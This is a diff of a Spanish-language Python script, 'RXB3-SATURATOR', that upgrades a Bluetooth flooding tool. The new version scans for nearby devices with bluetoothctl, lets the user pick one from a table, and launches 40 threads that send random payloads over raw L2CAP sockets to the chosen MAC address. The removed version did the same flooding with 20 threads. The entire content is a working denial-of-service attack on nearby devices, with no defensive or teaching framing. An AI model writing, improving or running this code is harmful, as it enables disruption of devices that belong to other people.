@@ -1,71 +1,70 @@
 #!/usr/bin/env python3
-import socket, struct, time, random, threading, os, sys
+import os, sys, time, threading, subprocess, socket
 
-# Interfaz visual profesional con Rich
 try:
     from rich.console import Console
-    from rich.panel import Panel
+    from rich.table import Table
     console = Console()
 except ImportError:
-    class FakeConsole:
-        def print(self, m, **k): print(m)
-    console = FakeConsole()
+    os.system("pip install rich")
+    from rich.console import Console
+    from rich.table import Table
 
-# Protocolo nativo L2CAP (Sin dependencias externas)
-BTPROTO_L2CAP = 0
-
-class Rxb3Saturator:
-    def __init__(self):
-        self.running = False
-        self.stats = {'packets': 0, 'errors': 0, 'start_time': time.time()}
-    
-    def attack(self, target_mac):
-        while self.running:
-            try:
-                # Sockets nativos: Comunicación directa con el hardware
-                s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_L2CAP)
-                s.connect((target_mac, 0))
-                while self.running:
-                    s.send(os.urandom(1024))
-                    self.stats['packets'] += 1
-            except:
-                self.stats['errors'] += 1
-                time.sleep(0.05)
+def scan_real():
+    console.print("[bold cyan]🔍 Escaneando... (Prendé el Bluetooth manualmente)[/bold cyan]")
+    # Usamos bluetoothctl para un escaneo más compatible
+    try:
+        # Iniciamos el escaneo por 5 segundos
+        subprocess.run(["bluetoothctl", "scan", "on"], timeout=5, stdout=subprocess.DEVNULL)
+        output = subprocess.getoutput("bluetoothctl devices")
+        devices = []
+        for line in output.split('\n'):
+            if "Device" in line:
+                parts = line.split(' ', 2)
+                devices.append({"mac": parts[1], "name": parts[2]})
+        return devices
+    except:
+        return []
 
 def main():
-    os.system('clear')
-    banner = """
-    [bold red]
-    ██████╗ ██╗  ██╗██████╗ ██████╗ 
-    ██╔══██╗╚██╗██╔╝██╔══██╗╚════██╗
-    ██████╔╝ ╚███╔╝ ██████╔╝ █████╔╝
-    ██╔══██╗ ██╔██╗ ██╔══██╗ ╚═══██╗
-    ██║  ██║██╔╝ ██╗██████╔╝██████╔╝
-    ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ [/bold red]
-    [bold white]  >> RXB3-SATURATOR v5.0 << [/bold white]
-    """
-    console.print(banner, justify="center")
-    console.print("[bold cyan]Motor Nativo - Sin Errores de Módulos[/bold cyan]\n", justify="center")
+    os.system("clear")
+    console.print("[bold red]⚡ RXB3-SATURATOR v6.8 (FIX) ⚡[/bold red]\n")
     
-    mac = input(" [?] Dirección MAC del objetivo: ").strip()
-    if len(mac) < 12:
-        print(" [!] MAC inválida.")
+    found = scan_real()
+    if not found:
+        console.print("[bold yellow][!] No se detectaron dispositivos.[/bold yellow]")
+        console.print("[white]1. Prendé el Bluetooth del cel.\n2. Poné el otro dispositivo en 'Visible'.[/white]")
         return
 
-    saturador = Rxb3Saturator()
-    saturador.running = True
+    table = Table(title="DISPOSITIVOS ENCONTRADOS")
+    table.add_column("ID", style="cyan")
+    table.add_column("MAC", style="magenta")
+    table.add_column("NOMBRE", style="white")
+
+    for i, d in enumerate(found):
+        table.add_row(str(i), d['mac'], d['name'])
+    console.print(table)
     
-    print(f"\n [!] Iniciando inundación contra: {mac}")
-    for _ in range(20):
-        threading.Thread(target=saturador.attack, args=(mac,), daemon=True).start()
+    idx = input("\n[?] Elegí el ID del objetivo: ")
+    target = found[int(idx)]['mac']
+
+    console.print(f"[bold red]🚀 Atacando a {target}... (Ctrl+C para parar)[/bold red]")
+    
+    def flood():
+        while True:
+            try:
+                s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, 0)
+                s.connect((target, 0))
+                s.send(os.urandom(1024))
+            except: pass
+
+    for _ in range(40): # Potencia máxima
+        threading.Thread(target=flood, daemon=True).start()
     
     try:
-        while True:
-            print(f" [>] Paquetes: {saturador.stats['packets']} | Errores: {saturador.stats['errors']}", end="\r")
-            time.sleep(0.1)
+        while True: time.sleep(1)
     except KeyboardInterrupt:
-        saturador.running = False
-        print("\n\n [✓] Ataque detenido por el usuario.")
+        print("\n[✓] Detenido.")
 
 if __name__ == "__main__":
     main()
